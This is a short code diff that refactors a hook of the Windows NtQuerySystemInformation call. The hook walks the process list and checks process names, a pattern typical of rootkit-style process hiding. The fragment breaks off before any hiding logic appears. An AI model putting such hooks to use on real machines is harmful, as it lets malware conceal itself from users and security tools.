@@ -23,11 +23,10 @@ NTSTATUS _stdcall HookNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
     const NTSTATUS Result = FuncNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
     if (NT_SUCCESS(Result) && SystemInformationClass == SystemProcessInformation) {
-        PSYSTEM_PROCESS_INFO pCurrent = NULL;
         PSYSTEM_PROCESS_INFO pNext = static_cast<PSYSTEM_PROCESS_INFO>(SystemInformation);
 
         do {
-            pCurrent = pNext;
+            const PSYSTEM_PROCESS_INFO pCurrent = pNext;
             pNext = reinterpret_cast<PSYSTEM_PROCESS_INFO>(reinterpret_cast<PUCHAR>(pCurrent) + pCurrent->NextEntryOffset);
 
             if (checkProcessName(pNext->ImageName.Buffer)) {
